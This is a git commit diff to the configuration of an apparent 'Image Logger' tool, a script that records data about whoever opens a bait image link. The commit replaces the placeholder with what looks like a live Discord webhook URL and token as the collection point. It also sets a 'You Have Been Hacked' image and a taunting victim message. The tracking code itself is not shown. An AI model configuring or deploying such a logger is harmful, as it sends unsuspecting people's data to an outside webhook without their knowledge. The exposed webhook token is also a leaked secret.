72a9eff21266a49d2f8a9b573a05ae4652f1f0b0
Kacperrro4 <121729259+Kacperrro4@users.noreply.github.com>
2025-11-30 20:14:58 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444767045614047253/9YeTf55RKn2RTl1sWK7vCmo5Q2Xp02BIKKA11idEbRKFbibpXTHPCz-KxG5t0hv0nMcI",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/2/26/You_Have_Been_Hacked%21.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "message": "Yo have been hacked by 0rtal10n :D", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
